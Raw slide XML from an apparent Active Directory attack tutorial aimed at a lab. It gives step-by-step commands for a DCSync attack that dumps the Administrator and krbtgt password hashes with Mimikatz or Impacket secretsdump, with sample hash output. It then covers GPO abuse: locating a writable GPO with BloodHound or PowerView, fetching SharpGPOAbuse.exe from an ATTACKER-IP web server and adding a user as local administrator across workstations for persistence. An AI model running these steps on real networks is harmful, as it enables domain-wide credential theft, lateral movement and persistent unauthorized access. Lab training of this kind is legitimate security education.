            <a:ext cx="4130367" cy="1716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514406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5633884" cy="6858000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1700" dirty="0"/>
              <a:t> At this point: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700" dirty="0"/>
              <a:t>YOU ARE NOW ABLE TO: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700" dirty="0"/>
              <a:t>💀 Perform </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>DCSync</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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700" dirty="0"/>
              <a:t>Step 5 — Perform </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>DCSync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> (Proof)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700" dirty="0"/>
              <a:t>After you run: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700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="95000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>Add-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="95000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>DomainObjectAcl</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="95000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t> ... -Rights </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1">
                <a:solidFill>
                  <a:schemeClr val="tx1">
                    <a:lumMod val="95000"/>
                  </a:schemeClr>
                </a:solidFill>
              </a:rPr>
              <a:t>DCSync</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0">
              <a:solidFill>
                <a:schemeClr val="tx1">
                  <a:lumMod val="95000"/>
                </a:schemeClr>
              </a:solidFill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1700" dirty="0"/>
              <a:t>👉 You now have permission to ask the Domain Controller for password data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700" dirty="0"/>
              <a:t>Now you need a tool to actually make that request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700" dirty="0"/>
              <a:t>🎯 Two practical ways to do </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>DCSync</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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700" dirty="0"/>
              <a:t>You only need ONE of these in your lab.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8F9CEB0-3537-8E60-B3FE-855FC2C13768}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5773994" y="-238151"/>
            <a:ext cx="6120580" cy="50037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200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Method 1 — Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>Mimikatz</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> (inside Windows)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>👉 Use this if you have a shell on a domain-joined machine</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>✅ Steps</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>1. Run </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>Mimikatz</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>mimikatz.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>2. Enable privileges</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>privilege::debug</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>3. Perform </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>DCSync</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="200000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>lsadump</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>::</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>dcsync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>domain:corp.local</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>user:Administrator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34310514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29029"/>
            <a:ext cx="12192000" cy="68580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700" dirty="0"/>
              <a:t>💥 Output example</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>User : Administrator</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Hash NTLM: 8846f7eaee8fb117ad06bdd830b7586c</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>🔥 What you just did:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>👉 You asked the Domain Controller:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>“Give me Administrator’s password hash”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>And it gave it to you.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>💡 You can also dump:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>lsadump</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>::</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>dcsync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>domain:corp.local</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>user:krbtgt</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>👉 This is even more powerful (Golden Ticket path)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="343824212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6C61FD82-1FA5-78DF-D027-449155B27B68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51844" y="586759"/>
            <a:ext cx="9504762" cy="5946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204659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78C7D3-0BB7-B5FC-9DB8-47E0884456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5798634" cy="657922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dirty="0"/>
              <a:t> Method 2 — Using </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>Impacket</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> (from Kali)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>👉 Cleaner and more common in labs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Command:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>secretsdump.py </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>corp.local</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>your_user:Password@DC-IP</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>💥 Example:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>secretsdump.py </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>corp.local</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>/john:Password123@192.168.1.10</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>💥 Output:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Administrator:500:HASH</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>krbtgt:502:HASH</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>user1:1001:HASH</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>🔥 What this means:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1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98F8155-CF4C-4F77-F822-26C965488577}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6096000" y="593677"/>
            <a:ext cx="6122018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800" dirty="0"/>
              <a:t>You now have:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>Domain Admin hash</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>KRBTGT hash</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>All user hashes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>💀 Full domain compromise</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>⚠️ VERY IMPORTANT CONDITIONS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>If </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>DCSync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> fails, check:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>✔ You successfully added </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>DCSync</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> rights</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>✔ You are targeting correct domain</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>✔ Correct credentials</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>✔ Network access to Domain Controller</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="22038469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6518787" cy="6858000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1700" dirty="0"/>
              <a:t>Part3 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>GPO Abuse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>: Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>SharpGPOAbuse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> to create a malicious GPO that adds your user to the local Administrators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700" dirty="0"/>
              <a:t> group on all workstations.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700" dirty="0"/>
              <a:t>Step 1 — Get GPO Name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700" dirty="0"/>
              <a:t>On your compromised Windows machine (or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>BloodHound</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>):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700" dirty="0"/>
              <a:t>Find the GPO you control.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700" dirty="0"/>
              <a:t>Example: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700" dirty="0"/>
              <a:t>Workstation Policy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700" dirty="0"/>
              <a:t>Default Domain Policy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700" dirty="0"/>
              <a:t>IT-Admins-GPO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700" dirty="0"/>
              <a:t>Method A — From </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>BloodHound</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> (BEST)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700" dirty="0"/>
              <a:t>Steps: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FF78F7F-3114-CDBA-B46B-5A73DE18865E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6916994" y="-131998"/>
            <a:ext cx="6120580" cy="50358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1800" dirty="0"/>
              <a:t>Open </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>BloodHound</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="18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800" dirty="0"/>
              <a:t>Search your user (top search bar)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800" dirty="0"/>
              <a:t>Click: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800" dirty="0"/>
              <a:t>Shortest Path to Domain Admins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800" dirty="0"/>
              <a:t>🔍 Now look for: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800" dirty="0"/>
              <a:t>Edges like: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800" dirty="0" err="1"/>
              <a:t>GenericWrite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> → GPO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800" dirty="0" err="1"/>
              <a:t>GenericAll</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> → GPO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800" dirty="0"/>
              <a:t>💥 Click the GPO node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800" dirty="0"/>
              <a:t>You will see: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800" dirty="0"/>
              <a:t>Name: Workstation Policy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800" dirty="0"/>
              <a:t>👉 ✅ THAT is your GPO name</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="95486836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F86205-81F6-2A4D-E586-74DCD1AF8E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1353800" cy="6176963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1700" dirty="0"/>
              <a:t>Method B — From </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>PowerView</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> (inside Windows)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700" dirty="0"/>
              <a:t>If </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>BloodHound</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> is confusing, use this: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700" dirty="0"/>
              <a:t>Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>DomainGPO</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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700" dirty="0"/>
              <a:t>Output example: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700" dirty="0" err="1"/>
              <a:t>displayname</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> : Default Domain Policy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700" dirty="0" err="1"/>
              <a:t>displayname</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> : Workstation Policy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="17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1E8962F-BE05-E3A3-E003-4F401DE0B655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69301" y="3429000"/>
            <a:ext cx="6858000" cy="31349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526988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10287000" cy="6648450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1700" dirty="0"/>
              <a:t>👉 Pick the one you have rights over (from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>BloodHound</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>)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700" dirty="0"/>
              <a:t>Step 2 — Move </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>SharpGPOAbuse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> to target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700" dirty="0"/>
              <a:t>Place SharpGPOAbuse.exe on the compromised Windows machine.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700" dirty="0"/>
              <a:t>STEP 2 — How to move </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>SharpGPOAbuse</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> to victim (PRACTICALLY)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700" dirty="0"/>
              <a:t>You need the tool on the Windows machine where you have shell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600" dirty="0"/>
              <a:t>Method 1 — Simple HTTP download (MOST USED)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600" dirty="0"/>
              <a:t>On Kali (attacker):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600" dirty="0"/>
              <a:t>python3 -m </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>http.server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t> 8000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600" dirty="0"/>
              <a:t>On Windows victim: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600" dirty="0"/>
              <a:t>Invoke-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>WebRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t> http://ATTACKER-IP:8000/SharpGPOAbuse.exe -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1"/>
              <a:t>OutFile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t> SharpGPOAbuse.exe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600" dirty="0"/>
              <a:t>👉 Replace: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600" dirty="0"/>
              <a:t>ATTACKER-IP = your Kali IP</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="290151109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5147187" cy="6858000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1700" dirty="0"/>
              <a:t> Method 2 — Using browser (if GUI available)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700" dirty="0"/>
              <a:t>Open browser on victim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700" dirty="0"/>
              <a:t>Go to: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700" dirty="0"/>
              <a:t>http://ATTACKER-IP:8000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700" dirty="0"/>
              <a:t>Download the file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700" dirty="0"/>
              <a:t> Method 3 — SMB share (optional)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700" dirty="0"/>
              <a:t>If you have share access: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700" dirty="0"/>
              <a:t>copy \\ATTACKER-IP\share\SharpGPOAbuse.exe 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700" dirty="0"/>
              <a:t> Verify Step 2 worked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700" dirty="0"/>
              <a:t>Run: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700" dirty="0" err="1"/>
              <a:t>dir</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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700" dirty="0"/>
              <a:t>👉 You should see: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700" dirty="0"/>
              <a:t>SharpGPOAbuse.exe</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="17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0B3F033-50A3-38E5-F5E8-939F03E20DA6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5656006" y="0"/>
            <a:ext cx="6120580" cy="42073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1800" dirty="0"/>
              <a:t>Step 3 — Execute the abuse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800" dirty="0"/>
              <a:t>Run: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800" dirty="0"/>
              <a:t>SharpGPOAbuse.exe --</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>AddLocalAdmin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> --</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>UserAccount</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>your_user</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> --</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>GPOName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> "Workstation Policy"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800" dirty="0"/>
              <a:t>🔍 What this command does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800" dirty="0"/>
              <a:t>Edits the GPO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800" dirty="0"/>
              <a:t>Adds your user to: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800" dirty="0"/>
              <a:t>Local Administrators group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800" dirty="0"/>
              <a:t>This is written into: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800" dirty="0"/>
              <a:t>SYSVOL (policy files)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="132577452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10058400" cy="6858000"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="1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1800" dirty="0"/>
              <a:t>Step 4 — Apply the GPO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800" dirty="0"/>
              <a:t>Either wait OR force it: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800" dirty="0" err="1"/>
              <a:t>gpupdate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t> /force</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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700" dirty="0"/>
              <a:t> Step 5 — Verify (IMPORTANT)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700" dirty="0"/>
              <a:t>On a target machine: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700" dirty="0"/>
              <a:t>net </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0" err="1"/>
              <a:t>localgroup</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t> administrators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700" dirty="0"/>
              <a:t>👉 You should see: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700" dirty="0" err="1"/>
              <a:t>your_user</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="17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600" dirty="0"/>
              <a:t>💥 RESULT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600" dirty="0"/>
              <a:t>You now have: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600" dirty="0"/>
              <a:t>✔ Local admin on multiple machines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600" dirty="0"/>
              <a:t>✔ Ability to execute commands remotely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600" dirty="0"/>
              <a:t>✔ Lateral movement capability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600" dirty="0"/>
              <a:t>✔ Persistence via GPO</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="150000"/>
